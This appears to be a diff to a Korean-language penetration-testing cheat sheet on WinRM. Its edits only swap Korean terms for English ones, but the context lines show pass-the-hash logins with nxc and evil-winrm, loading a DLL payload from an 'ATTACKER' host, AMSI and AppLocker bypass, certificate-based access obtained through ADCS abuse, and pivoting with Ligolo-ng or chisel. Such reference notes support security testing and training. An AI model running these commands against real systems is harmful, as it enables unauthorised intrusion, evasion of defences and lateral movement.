@@ -18,12 +18,12 @@ Windows Remote Management. PowerShell Remoting에 사용. 5985(HTTP), 5986(HTTPS
 nxc winrm TARGET -u user -p pass
 nxc winrm TARGET -u user -H NTHASH
 
-# "Pwn3d!" 표시 = 쉘 획득 가능
+# "Pwn3d!" 표시 = shell 획득 가능
 ```
 
 ---
 
-## 쉘 획득
+## shell 획득
 
 ### evil-winrm
 
@@ -56,7 +56,7 @@ menu  # 사용 가능한 함수 확인
 evil-winrm -i TARGET -u user -p pass -e /opt/dlls/
 Dll-Loader -http http://ATTACKER/payload.dll
 
-# 바이너리 로드 (AppLocker 우회)
+# binary 로드 (AppLocker 우회)
 Bypass-4MSI  # AMSI 우회 시도
 ```
 
@@ -134,7 +134,7 @@ Enter-PSSession -ComputerName TARGET -Authentication CredSSP -Credential $cred
 
 ## 인증서 기반 인증
 
-비밀번호 / 해시 없이 클라이언트 인증서(PKINIT / WinRM client cert mapping) 로 인증.
+비밀번호 / hash 없이 클라이언트 인증서(PKINIT / WinRM client cert mapping) 로 인증.
 
 ```powershell
 # 서버: 사용자-인증서 매핑 생성 (관리자 권한)
@@ -154,11 +154,11 @@ ADCS ESC 공격(예: ESC1) 으로 발급받은 인증서를 WinRM 에 직접 쓸
 
 ---
 
-## 내부 포트포워딩으로 접근
+## 내부 port forwarding으로 접근
 
 WinRM 포트가 외부에서 막혀 있을 때 피봇 호스트를 경유.
 
 ```bash
-# Ligolo-ng / chisel 로 5985/5986 포워딩 후
+# Ligolo-ng / chisel 로 5985/5986 forwarding 후
 evil-winrm -i 127.0.0.1 -u user -H NTHASH -P 5985
 ```
